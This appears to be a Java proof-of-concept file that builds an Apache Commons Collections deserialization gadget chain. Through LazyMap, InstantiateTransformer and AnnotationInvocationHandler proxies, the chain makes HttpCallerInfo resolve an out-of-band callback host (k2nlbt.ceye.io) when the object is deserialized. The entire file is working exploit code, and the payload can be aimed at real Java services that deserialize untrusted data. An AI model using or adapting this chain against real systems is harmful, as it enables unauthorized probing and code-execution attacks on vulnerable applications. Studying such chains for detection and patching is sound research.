package com.example.CC3;

import com.example.Utils.ReflectionUtil;
import com.example.Utils.SerializeUtil;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InstantiateTransformer;
import org.apache.commons.collections.map.LazyMap;
import sun.net.www.protocol.http.HttpCallerInfo;

import java.lang.annotation.Retention;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.net.URL;
import java.util.HashMap;
import java.util.Map;

public class POC_2 {

    /***
     * <sun.reflect.annotation.AnnotationInvocationHandler: void readObject(java.io.ObjectInputStream)>
     * <sun.reflect.annotation.AnnotationInvocationHandler: java.lang.Object invoke(java.lang.Object,java.lang.reflect.Method,java.lang.Object[])>
     * <org.apache.commons.collections.map.LazyMap: java.lang.Object get(java.lang.Object)>
     * <org.apache.commons.collections.functors.InstantiateTransformer: java.lang.Object transform(java.lang.Object)>
     * <sun.net.www.protocol.http.HttpCallerInfo: void init(javax.xml.transform.Templates)>
     * <java.net.InetAddress: java.net.InetAddress getByName(java.lang.String)>
     */

    public static void main(String[] args) throws Exception {
        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(HttpCallerInfo.class),
                new InstantiateTransformer(new Class[]{URL.class},new Object[]{new URL("http://k2nlbt.ceye.io")})
        };
        Transformer transformChain = new ChainedTransformer(transformers);

        Map innerMap = new HashMap();
        Map outerMap = LazyMap.decorate(innerMap, transformChain);

        InvocationHandler handler = (InvocationHandler) ReflectionUtil.createObject("sun.reflect.annotation.AnnotationInvocationHandler",
                new Class[]{Class.class, Map.class},
                new Object[]{Retention.class, outerMap});

        Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(),new Class[]{Map.class}, handler);

        handler = (InvocationHandler) ReflectionUtil.createObject("sun.reflect.annotation.AnnotationInvocationHandler",
                new Class[]{Class.class, Map.class},
                new Object[]{Retention.class, proxyMap});

        SerializeUtil.deserialize(SerializeUtil.serialize(handler));
    }

}
